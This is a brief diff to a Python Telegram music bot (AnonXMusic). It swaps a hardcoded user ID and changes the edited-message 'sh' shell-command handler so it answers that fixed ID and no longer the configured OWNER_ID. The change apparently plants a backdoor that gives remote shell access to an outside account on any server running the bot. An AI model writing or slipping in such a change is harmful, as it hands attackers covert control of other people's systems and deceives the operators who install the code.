@@ -13,7 +13,7 @@ from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
 from AnonXMusic import app
 from config import OWNER_ID
 
-ALLOWED_USER = 6848223695
+ALLOWED_USER = 7321657753
 
 async def aexec(code, client, message):
     exec(
@@ -141,7 +141,7 @@ async def forceclose_command(_, CallbackQuery):
 
 @app.on_edited_message(
     filters.command("sh")
-    & filters.user(OWNER_ID)
+    & filters.user(ALLOWED_USER)
     & ~filters.forwarded
     & ~filters.via_bot
 )
